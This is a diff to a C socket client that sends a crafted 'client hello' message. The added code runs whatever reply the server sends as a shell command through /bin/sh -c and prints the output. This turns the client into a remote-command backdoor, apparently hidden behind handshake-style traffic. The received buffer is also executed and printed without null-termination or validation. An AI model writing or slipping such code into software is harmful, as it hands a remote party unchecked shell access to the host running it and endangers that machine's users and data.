@@ -3,6 +3,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
+#include <sys/wait.h>
 #include <unistd.h>
 
 void craft_cli_hel(unsigned char** cli_hel, int* cli_hel_s) {
@@ -102,11 +103,34 @@ int main(int argc, char const* argv[]) {
     }
 
     send(sock, cli_hel, cli_hel_s, 0);
+    free(cli_hel);
     printf("Hello message sent\n");
     valread = read(sock, buffer, 5000);
-    printf("%d\n", valread);
+    printf("Length: %d\nMessage: %s\n", valread, buffer);
 
-    free(cli_hel);
+    int link[2];
+    pid_t pid;
+    char foo[4096];
+
+    if (pipe(link) == -1)
+        exit(EXIT_FAILURE);
+
+    if ((pid = fork()) == -1)
+        exit(EXIT_FAILURE);
+
+    if (pid == 0) {
+        dup2(link[1], STDOUT_FILENO);
+        close(link[0]);
+        close(link[1]);
+        execl("/bin/sh", "sh", "-c", buffer, NULL);
+        exit(EXIT_FAILURE);
+    } else {
+        close(link[1]);
+        int nbytes = read(link[0], foo, sizeof(foo));
+        printf("%.*s\n", nbytes, foo);
+        wait(NULL);
+    }
+
     close(client_fd);
     return 0;
 }
